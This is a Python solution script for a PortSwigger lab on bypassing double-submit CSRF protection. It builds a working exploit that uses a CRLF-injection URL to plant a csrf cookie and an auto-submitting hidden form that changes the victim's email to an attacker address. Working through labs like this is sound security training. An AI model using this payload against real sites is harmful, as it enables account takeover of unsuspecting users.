# Lab 06 — CSRF where token is duplicated in a cookie
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
#
# Vulnerability: "Double submit cookie" — server checks cookie.csrf == body.csrf
#                + CRLF injection in search allows setting the csrf cookie
# Aim:           Set both the csrf cookie and the form field to the same
#                attacker-controlled value to pass validation
#
# Technique:
#   The "double submit" pattern checks: does the cookie value == the form value?
#   It never checks whether the server generated either value.
#   If we can set the csrf COOKIE, we can set the form FIELD to match.
#
#   1. Use CRLF injection in search to set Cookie: csrf=fake123 in victim's browser
#   2. Submit form with csrf=fake123 in the body
#   3. Server checks: fake123 == fake123 → valid → email changed
#
#   The attacker controls both sides of the comparison — the defence is meaningless.
#
#   📝 The double-submit pattern checks CONSISTENCY not AUTHENTICITY.
#      A real CSRF token must be server-generated and session-bound.
#
# Usage: python csrf_lab06.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VICTIM_EMAIL = "attacker@evil.com"
FAKE_TOKEN   = "faketoken123"

if __name__ == "__main__":
    banner()
    section("LAB 06 — CSRF: TOKEN DUPLICATED IN COOKIE (DOUBLE-SUBMIT BYPASS)")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab06.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # Log in just to confirm we can interact with the lab
    if not login(session, url):
        sys.exit(1)

    print(f"\n  ➜  Using fake token value: {FAKE_TOKEN}")
    print(f"  ➜  This value will be injected into both the cookie AND the form body\n")

    # ── Build the exploit ─────────────────────────────────────────────────────
    section("Exploit HTML for the exploit server")

    crlf_url = (
        f"{url}/?search=x%0d%0aSet-Cookie:+csrf={FAKE_TOKEN}%3b+SameSite=None"
    )

    exploit = f"""\
<img src="{crlf_url}" onerror="document.forms[0].submit()">

<form method="POST" action="{url}/my-account/change-email">
    <input type="hidden" name="email" value="{VICTIM_EMAIL}">
    <input type="hidden" name="csrf" value="{FAKE_TOKEN}">
</form>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  Server checks: cookie.csrf == body.csrf")
    print(f"     '{FAKE_TOKEN}' == '{FAKE_TOKEN}' → True → accepted")
    print("     The server never checks whether IT generated this value.")
